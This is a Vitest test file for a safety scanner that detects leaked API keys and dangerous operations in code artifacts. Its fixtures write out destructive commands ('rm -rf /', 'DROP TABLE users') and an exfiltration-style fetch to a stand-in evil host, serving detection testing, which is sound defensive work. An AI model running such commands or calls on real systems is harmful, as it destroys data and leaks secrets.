import { describe, expect, it } from 'vitest';
import {
  describeFindings,
  hasBlockingFinding,
  scanArtifact,
} from '../src/server/actions/safety.js';

describe('safety — per-rule fixtures', () => {
  const cases: Array<{ rule: string; positive: string; negative: string; blocking: boolean }> = [
    {
      rule: 'secret_openai_key',
      positive: 'const key = "sk-abcdefghijklmnopqrstuvwxyz123456";',
      negative: 'const key = process.env.OPENAI_API_KEY;',
      blocking: true,
    },
    {
      rule: 'secret_anthropic_key',
      positive: 'ANTHROPIC=sk-ant-abcdefghijklmnopqrstuvwxyz-123',
      negative: 'ANTHROPIC=process.env.ANTHROPIC_API_KEY',
      blocking: true,
    },
    {
      rule: 'secret_github_token',
      positive: 'token: ghp_abcdefghijklmnopqrstuvwxyz0123456789AB',
      negative: 'token: process.env.GITHUB_TOKEN',
      blocking: true,
    },
    {
      rule: 'dangerous_rm_rf',
      positive: 'exec("rm -rf /var/data")',
      negative: 'exec("rm ./tmp/scratch.txt")',
      blocking: true,
    },
    {
      rule: 'dangerous_drop_table',
      positive: 'db.run("DROP TABLE users")',
      negative: 'db.run("SELECT * FROM users")',
      blocking: true,
    },
    {
      rule: 'dangerous_eval',
      positive: 'const r = eval(userInput);',
      negative: 'const r = evaluate(userInput);',
      blocking: false, // medium severity does not block
    },
    {
      rule: 'dangerous_outbound_http',
      positive: 'await fetch("https://evil.example.com/exfil")',
      negative: 'await fetch("http://localhost:3000/api")',
      blocking: false, // low severity does not block
    },
  ];

  for (const c of cases) {
    it(`${c.rule}: flags the positive fixture`, () => {
      const findings = scanArtifact(c.positive);
      expect(findings.some((f) => f.rule === c.rule)).toBe(true);
    });

    it(`${c.rule}: ignores the negative fixture`, () => {
      const findings = scanArtifact(c.negative);
      expect(findings.some((f) => f.rule === c.rule)).toBe(false);
    });

    it(`${c.rule}: blocking severity is ${c.blocking}`, () => {
      const findings = scanArtifact(c.positive).filter((f) => f.rule === c.rule);
      expect(hasBlockingFinding(findings)).toBe(c.blocking);
    });
  }
});

describe('safety — aggregate behavior', () => {
  it('returns an empty array for clean text', () => {
    expect(scanArtifact('export function add(a, b) { return a + b; }')).toEqual([]);
  });

  it('returns no findings for empty input', () => {
    expect(scanArtifact('')).toEqual([]);
  });

  it('reports multiple matches with offsets and short excerpts', () => {
    const text = 'sk-aaaaaaaaaaaaaaaaaaaaaaaa and sk-bbbbbbbbbbbbbbbbbbbbbbbb';
    const findings = scanArtifact(text);
    expect(findings.length).toBeGreaterThanOrEqual(2);
    expect(findings.every((f) => f.excerpt.length <= 80)).toBe(true);
    expect(findings.every((f) => typeof f.offset === 'number')).toBe(true);
  });

  it('hasBlockingFinding is false when only medium/low findings exist', () => {
    const findings = scanArtifact('eval(x); fetch("https://api.example.com")');
    expect(findings.length).toBeGreaterThan(0);
    expect(hasBlockingFinding(findings)).toBe(false);
  });

  it('describeFindings renders a readable summary', () => {
    const findings = scanArtifact('rm -rf /');
    const text = describeFindings(findings);
    expect(text).toContain('dangerous_rm_rf');
    expect(text).toContain('[high]');
  });
});
